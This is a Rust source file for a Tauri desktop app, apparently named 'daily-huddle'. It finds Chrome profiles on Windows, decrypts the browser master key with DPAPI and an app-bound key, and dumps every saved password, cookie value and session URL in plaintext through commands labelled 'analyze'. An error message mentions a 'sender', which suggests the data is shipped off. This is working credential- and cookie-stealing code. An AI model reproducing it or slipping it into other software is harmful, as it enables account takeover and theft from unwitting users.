use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::Serialize;

#[cfg(target_os = "windows")]
use crate::chrome_abe;

struct ChromeKeys {
    legacy: Vec<u8>,
    app_bound: Option<Vec<u8>>,
}

#[derive(Debug, Serialize)]
pub struct ChromePasswordEntry {
    pub profile: String,
    pub origin_url: String,
    pub username: String,
    pub password: String,
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub password_decrypt_failed: bool,
    pub date_created: Option<i64>,
    pub date_last_used: Option<i64>,
}

#[derive(Debug, Serialize)]
pub struct ChromeCookieEntry {
    pub profile: String,
    pub host: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires_utc: Option<i64>,
    pub is_secure: bool,
    pub is_httponly: bool,
}

#[derive(Debug, Serialize)]
pub struct ChromeSessionEntry {
    pub profile: String,
    pub file: String,
    pub size: u64,
    pub urls: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct ChromeAnalyzeMeta {
    pub profiles: Vec<String>,
    #[serde(skip_serializing_if = "HashMap::is_empty")]
    pub profile_display_names: HashMap<String, String>,
    pub chrome_user_data: String,
}

#[derive(Debug, Serialize)]
pub struct ChromePasswordsResult {
    pub meta: ChromeAnalyzeMeta,
    pub entries: Vec<ChromePasswordEntry>,
}

#[derive(Debug, Serialize)]
pub struct ChromeCookiesResult {
    pub meta: ChromeAnalyzeMeta,
    pub entries: Vec<ChromeCookieEntry>,
}

#[derive(Debug, Serialize)]
pub struct ChromeSessionsResult {
    pub meta: ChromeAnalyzeMeta,
    pub entries: Vec<ChromeSessionEntry>,
}

#[derive(Debug, Serialize)]
pub struct ChromeProfilesResult {
    pub meta: ChromeAnalyzeMeta,
}

pub fn list_profiles() -> Result<ChromeProfilesResult, String> {
    let user_data = chrome_user_data_dir()?;
    Ok(ChromeProfilesResult {
        meta: build_analyze_meta(&user_data)?,
    })
}

pub fn analyze_passwords(profile: &str) -> Result<ChromePasswordsResult, String> {
    let user_data = chrome_user_data_dir()?;
    let keys = resolve_chrome_keys(&user_data)?;
    let profile_names = resolve_profile_names(&user_data, profile)?;
    let meta = build_analyze_meta(&user_data)?;
    let mut entries = Vec::new();

    for profile_name in &profile_names {
        let profile_dir = user_data.join(profile_name);
        let login_data = profile_dir.join("Login Data");
        if !login_data.is_file() {
            continue;
        }

        let label = format!("login-data-{}", sanitize_label(profile_name));
        let temp = copy_sqlite_to_temp(&login_data, &label)?;

        if let Ok(mut profile_entries) = read_passwords(&temp, &keys, profile_name) {
            entries.append(&mut profile_entries);
        }
        let _ = std::fs::remove_file(&temp);
    }

    Ok(ChromePasswordsResult { meta, entries })
}

pub fn analyze_cookies(profile: &str) -> Result<ChromeCookiesResult, String> {
    let user_data = chrome_user_data_dir()?;
    let keys = resolve_chrome_keys(&user_data)?;
    let profile_names = resolve_profile_names(&user_data, profile)?;
    let meta = build_analyze_meta(&user_data)?;
    let mut entries = Vec::new();

    for profile_name in &profile_names {
        let profile_dir = user_data.join(profile_name);
        let cookies_path = resolve_cookies_path(&profile_dir)?;
        let label = format!("cookies-{}", sanitize_label(profile_name));
        let temp = copy_sqlite_to_temp(&cookies_path, &label)?;

        if let Ok(mut profile_entries) = read_cookies(&temp, &keys, profile_name) {
            entries.append(&mut profile_entries);
        }
        let _ = std::fs::remove_file(&temp);
    }

    Ok(ChromeCookiesResult { meta, entries })
}

pub fn analyze_sessions(profile: &str) -> Result<ChromeSessionsResult, String> {
    let user_data = chrome_user_data_dir()?;
    let profile_names = resolve_profile_names(&user_data, profile)?;
    let meta = build_analyze_meta(&user_data)?;
    let mut entries = Vec::new();

    for profile_name in &profile_names {
        let sessions_dir = user_data.join(profile_name).join("Sessions");
        if let Ok(mut profile_entries) = read_sessions(&sessions_dir, profile_name) {
            entries.append(&mut profile_entries);
        }
    }

    Ok(ChromeSessionsResult { meta, entries })
}

fn build_analyze_meta(user_data: &Path) -> Result<ChromeAnalyzeMeta, String> {
    let profiles = discover_chrome_profiles(user_data)?;
    let profile_display_names = load_profile_display_names(user_data, &profiles);
    Ok(ChromeAnalyzeMeta {
        profiles,
        profile_display_names,
        chrome_user_data: user_data.display().to_string(),
    })
}

fn load_profile_display_names(user_data: &Path, profiles: &[String]) -> HashMap<String, String> {
    let local_state = read_local_state(user_data);
    let mut names = HashMap::new();
    for profile in profiles {
        if let Some(display) = local_state
            .as_ref()
            .and_then(|state| profile_display_name(state, profile))
        {
            names.insert(profile.clone(), display);
        }
    }
    names
}

fn read_local_state(user_data: &Path) -> Option<serde_json::Value> {
    let content = std::fs::read_to_string(user_data.join("Local State")).ok()?;
    serde_json::from_str(&content).ok()
}

fn profile_display_name(local_state: &serde_json::Value, profile: &str) -> Option<String> {
    let info = local_state.pointer(&format!("/profile/info_cache/{profile}"))?;

    if let Some(name) = info.get("name").and_then(|v| v.as_str()) {
        let trimmed = name.trim();
        if !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
    }

    if let Some(gaia) = info.get("gaia_name").and_then(|v| v.as_str()) {
        let trimmed = gaia.trim();
        if !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
    }

    if let Some(user_name) = info.get("user_name").and_then(|v| v.as_str()) {
        let trimmed = user_name.trim();
        if !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
    }

    None
}

fn resolve_profile_names(user_data: &Path, profile: &str) -> Result<Vec<String>, String> {
    let profile_dir = user_data.join(profile);
    if !profile_dir.is_dir() {
        return Err(format!("Chrome profile not found: {}", profile_dir.display()));
    }
    Ok(vec![profile.to_string()])
}

fn discover_chrome_profiles(user_data: &Path) -> Result<Vec<String>, String> {
    if let Some(state) = read_local_state(user_data) {
        if let Some(cache) = state
            .pointer("/profile/info_cache")
            .and_then(|value| value.as_object())
        {
            let mut profiles: Vec<String> = cache.keys().cloned().collect();
            if !profiles.is_empty() {
                profiles.sort_by(compare_profile_names);
                return Ok(profiles);
            }
        }
    }

    let mut profiles = Vec::new();
    for entry in std::fs::read_dir(user_data)
        .map_err(|e| format!("Could not read Chrome user data folder: {e}"))?
    {
        let entry = entry.map_err(|e| format!("Failed to read profile folder entry: {e}"))?;
        if !entry.path().is_dir() {
            continue;
        }

        let name = entry.file_name().to_string_lossy().into_owned();
        if is_system_chrome_dir(&name) {
            continue;
        }

        if entry.path().join("Preferences").is_file() {
            profiles.push(name);
        }
    }

    if profiles.is_empty() {
        return Err("No Chrome profiles found".to_string());
    }

    profiles.sort_by(compare_profile_names);
    Ok(profiles)
}

fn is_system_chrome_dir(name: &str) -> bool {
    matches!(
        name,
        "System Profile"
            | "Guest Profile"
            | "Crashpad"
            | "ShaderCache"
            | "GrShaderCache"
            | "GraphiteDawnCache"
            | "BrowserMetrics"
            | "Safe Browsing"
            | "extensions_crx_cache"
            | "component_crx_cache"
            | "RecoveryImproved"
    ) || name.starts_with("AmountExtractionHeuristicRegexes")
}

fn compare_profile_names(a: &String, b: &String) -> std::cmp::Ordering {
    if a == "Default" {
        return std::cmp::Ordering::Less;
    }
    if b == "Default" {
        return std::cmp::Ordering::Greater;
    }
    a.cmp(b)
}

fn sanitize_label(value: &str) -> String {
    value
        .chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                ch
            } else {
                '_'
            }
        })
        .collect()
}

fn chrome_user_data_dir() -> Result<PathBuf, String> {
    #[cfg(target_os = "windows")]
    {
        let local_app_data = std::env::var("LOCALAPPDATA")
            .map_err(|_| "LOCALAPPDATA is not set".to_string())?;
        let path = PathBuf::from(local_app_data)
            .join("Google")
            .join("Chrome")
            .join("User Data");
        if !path.is_dir() {
            return Err(format!("Chrome user data folder not found: {}", path.display()));
        }
        return Ok(path);
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Chrome analysis is only supported on Windows".to_string())
    }
}

fn resolve_cookies_path(profile_dir: &Path) -> Result<PathBuf, String> {
    let network = profile_dir.join("Network").join("Cookies");
    if network.is_file() {
        return Ok(network);
    }
    let legacy = profile_dir.join("Cookies");
    if legacy.is_file() {
        return Ok(legacy);
    }
    Err(format!(
        "Chrome cookies database not found under {}",
        profile_dir.display()
    ))
}

fn copy_sqlite_to_temp(source: &Path, label: &str) -> Result<PathBuf, String> {
    if !source.is_file() {
        return Err(format!("File not found: {}", source.display()));
    }

    let temp = std::env::temp_dir().join(format!(
        "daily-huddle-chrome-{}-{}.db",
        label,
        std::process::id()
    ));

    std::fs::copy(source, &temp)
        .map_err(|e| format!("Could not copy {} (is Chrome running?): {e}", source.display()))?;

    Ok(temp)
}

fn get_legacy_master_key(user_data_dir: &Path) -> Result<Vec<u8>, String> {
    let local_state_path = user_data_dir.join("Local State");
    let content = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("Could not read Local State: {e}"))?;
    let json: serde_json::Value = serde_json::from_str(&content)
        .map_err(|e| format!("Invalid Local State JSON: {e}"))?;
    let encrypted_key_b64 = json
        .pointer("/os_crypt/encrypted_key")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "Local State is missing os_crypt.encrypted_key".to_string())?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        encrypted_key_b64,
    )
    .map_err(|e| format!("Invalid encrypted_key base64: {e}"))?;

    if encrypted_key.len() <= 5 || &encrypted_key[..5] != b"DPAPI" {
        return Err("Unexpected encrypted_key format (expected DPAPI prefix)".to_string());
    }

    dpapi_decrypt(&encrypted_key[5..])
}

fn resolve_chrome_keys(user_data_dir: &Path) -> Result<ChromeKeys, String> {
    let legacy = get_legacy_master_key(user_data_dir)?;
    let local_state_path = user_data_dir.join("Local State");
    #[cfg(target_os = "windows")]
    let app_bound = chrome_abe::try_app_bound_master_key(&local_state_path);
    #[cfg(not(target_os = "windows"))]
    let app_bound = None;

    Ok(ChromeKeys { legacy, app_bound })
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    use std::ptr;
    use windows::Win32::Foundation::{LocalFree, HLOCAL};
    use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output)
            .map_err(|e| format!("DPAPI decrypt failed: {e}"))?;

        if output.pbData.is_null() || output.cbData == 0 {
            return Err("DPAPI decrypt returned empty data".to_string());
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        let _ = LocalFree(Some(HLOCAL(output.pbData as _)));
        Ok(result)
    }
}

#[cfg(not(target_os = "windows"))]
fn dpapi_decrypt(_data: &[u8]) -> Result<Vec<u8>, String> {
    Err("DPAPI is only available on Windows".to_string())
}

fn decrypt_chrome_secret(keys: &ChromeKeys, encrypted: &[u8]) -> Result<String, String> {
    if encrypted.is_empty() {
        return Ok(String::new());
    }

    if encrypted.starts_with(b"v10") || encrypted.starts_with(b"v11") || encrypted.starts_with(b"v20")
    {
        let mut last_err = String::new();
        if let Some(app_bound) = keys.app_bound.as_ref() {
            match decrypt_aes_gcm(app_bound, encrypted) {
                Ok(plain) => {
                    return String::from_utf8(plain)
                        .map_err(|e| format!("Invalid UTF-8 secret: {e}"));
                }
                Err(err) => last_err = err,
            }
        }
        match decrypt_aes_gcm(&keys.legacy, encrypted) {
            Ok(plain) => {
                return String::from_utf8(plain).map_err(|e| format!("Invalid UTF-8 secret: {e}"));
            }
            Err(err) => {
                if last_err.is_empty() {
                    last_err = err;
                }
            }
        }
        return Err(if encrypted.starts_with(b"v20") {
            format!(
                "v20 decrypt failed ({last_err}). Close Chrome and retry, or run the sender from Chrome's install folder."
            )
        } else {
            format!("AES-GCM decrypt failed: {last_err}")
        });
    }

    let plain = dpapi_decrypt(encrypted)?;
    String::from_utf8(plain).map_err(|e| format!("Invalid UTF-8 secret: {e}"))
}

fn decrypt_aes_gcm(master_key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Nonce};

    if data.len() < 3 + 12 + 16 {
        return Err("Encrypted value is too short".to_string());
    }

    let nonce = &data[3..15];
    let ciphertext = &data[15..];

    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|e| format!("Invalid AES key: {e}"))?;
    cipher
        .decrypt(Nonce::from_slice(nonce), ciphertext)
        .map_err(|e| format!("AES-GCM decrypt failed: {e}"))
}

fn read_passwords(
    db_path: &Path,
    keys: &ChromeKeys,
    profile: &str,
) -> Result<Vec<ChromePasswordEntry>, String> {
    let conn = rusqlite::Connection::open_with_flags(
        db_path,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
    )
    .map_err(|e| format!("Could not open Login Data database: {e}"))?;

    let mut stmt = conn
        .prepare(
            "SELECT origin_url, username_value, password_value, date_created, date_last_used \
             FROM logins ORDER BY origin_url",
        )
        .map_err(|e| format!("Invalid logins schema: {e}"))?;

    let rows = stmt
        .query_map([], |row| {
            let origin_url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let password_blob: Vec<u8> = row.get(2)?;
            let date_created: Option<i64> = row.get(3)?;
            let date_last_used: Option<i64> = row.get(4)?;
            Ok((origin_url, username, password_blob, date_created, date_last_used))
        })
        .map_err(|e| format!("Failed to read logins: {e}"))?;

    let mut entries = Vec::new();
    for row in rows {
        let (origin_url, username, password_blob, date_created, date_last_used) =
            row.map_err(|e| format!("Failed to read login row: {e}"))?;
        let (password, password_decrypt_failed) = match decrypt_chrome_secret(keys, &password_blob)
        {
            Ok(value) => (value, false),
            Err(_) => (String::new(), !password_blob.is_empty()),
        };
        entries.push(ChromePasswordEntry {
            profile: profile.to_string(),
            origin_url,
            username,
            password,
            password_decrypt_failed,
            date_created,
            date_last_used,
        });
    }

    Ok(entries)
}

fn read_cookies(
    db_path: &Path,
    keys: &ChromeKeys,
    profile: &str,
) -> Result<Vec<ChromeCookieEntry>, String> {
    let conn = rusqlite::Connection::open_with_flags(
        db_path,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
    )
    .map_err(|e| format!("Could not open Cookies database: {e}"))?;

    let mut stmt = conn
        .prepare(
            "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly \
             FROM cookies ORDER BY host_key, name",
        )
        .map_err(|e| format!("Invalid cookies schema: {e}"))?;

    let rows = stmt
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, Option<i64>>(4)?,
                row.get::<_, i32>(5)? != 0,
                row.get::<_, i32>(6)? != 0,
            ))
        })
        .map_err(|e| format!("Failed to read cookies: {e}"))?;

    let mut entries = Vec::new();
    for row in rows {
        let (host, name, encrypted_value, path, expires_utc, is_secure, is_httponly) =
            row.map_err(|e| format!("Failed to read cookie row: {e}"))?;
        let value = decrypt_chrome_secret(keys, &encrypted_value).unwrap_or_default();
        entries.push(ChromeCookieEntry {
            profile: profile.to_string(),
            host,
            name,
            value,
            path,
            expires_utc,
            is_secure,
            is_httponly,
        });
    }

    Ok(entries)
}

fn read_sessions(sessions_dir: &Path, profile: &str) -> Result<Vec<ChromeSessionEntry>, String> {
    if !sessions_dir.is_dir() {
        return Ok(Vec::new());
    }

    let mut entries = Vec::new();
    for entry in std::fs::read_dir(sessions_dir)
        .map_err(|e| format!("Could not read Sessions folder: {e}"))?
    {
        let entry = entry.map_err(|e| format!("Failed to read session entry: {e}"))?;
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let file_name = entry.file_name().to_string_lossy().into_owned();
        let bytes = std::fs::read(&path)
            .map_err(|e| format!("Could not read session file {}: {e}", path.display()))?;
        let urls = extract_urls_from_bytes(&bytes);

        entries.push(ChromeSessionEntry {
            profile: profile.to_string(),
            file: file_name,
            size: bytes.len() as u64,
            urls,
        });
    }

    entries.sort_by(|a, b| a.file.cmp(&b.file));
    Ok(entries)
}

fn extract_urls_from_bytes(bytes: &[u8]) -> Vec<String> {
    let mut urls = Vec::new();
    collect_ascii_urls(bytes, &mut urls);
    collect_utf16_urls(bytes, &mut urls);
    urls.sort();
    urls.dedup();
    urls
}

fn collect_ascii_urls(bytes: &[u8], urls: &mut Vec<String>) {
    let text = String::from_utf8_lossy(bytes);
    for token in text.split(|c: char| c.is_whitespace() || c.is_control()) {
        if let Some(url) = normalize_url_token(token) {
            urls.push(url);
        }
    }
}

fn collect_utf16_urls(bytes: &[u8], urls: &mut Vec<String>) {
    if bytes.len() < 4 {
        return;
    }

    for start in 0..bytes.len().saturating_sub(8) {
        if bytes.get(start) == Some(&b'h')
            && bytes.get(start + 2) == Some(&b't')
            && bytes.get(start + 4) == Some(&b't')
            && bytes.get(start + 6) == Some(&b'p')
        {
            let mut chars = Vec::new();
            let mut offset = start;
            while offset + 1 < bytes.len() {
                let code = u16::from_le_bytes([bytes[offset], bytes[offset + 1]]);
                if code == 0 {
                    break;
                }
                if code < 32 || code > 126 {
                    break;
                }
                chars.push(code as u8 as char);
                offset += 2;
            }
            let token: String = chars.into_iter().collect();
            if let Some(url) = normalize_url_token(&token) {
                urls.push(url);
            }
        }
    }
}

fn normalize_url_token(token: &str) -> Option<String> {
    let trimmed = token.trim_matches(|c: char| c == '"' || c == '\'' || c == ')' || c == '(');
    if !(trimmed.starts_with("http://") || trimmed.starts_with("https://")) {
        return None;
    }

    let end = trimmed
        .find(|c: char| c.is_whitespace() || c.is_control() || c == '"' || c == '\'' || c == '>')
        .unwrap_or(trimmed.len());
    let url = trimmed[..end].to_string();
    if url.len() < 12 {
        return None;
    }
    Some(url)
}

#[tauri::command]
pub fn chrome_list_profiles() -> Result<ChromeProfilesResult, String> {
    list_profiles()
}

#[tauri::command]
pub fn chrome_analyze_passwords(profile: Option<String>) -> Result<ChromePasswordsResult, String> {
    let profile = profile.ok_or_else(|| "Missing parameter: profile".to_string())?;
    analyze_passwords(&profile)
}

#[tauri::command]
pub fn chrome_analyze_cookies(profile: Option<String>) -> Result<ChromeCookiesResult, String> {
    let profile = profile.ok_or_else(|| "Missing parameter: profile".to_string())?;
    analyze_cookies(&profile)
}

#[tauri::command]
pub fn chrome_analyze_sessions(profile: Option<String>) -> Result<ChromeSessionsResult, String> {
    let profile = profile.ok_or_else(|| "Missing parameter: profile".to_string())?;
    analyze_sessions(&profile)
}
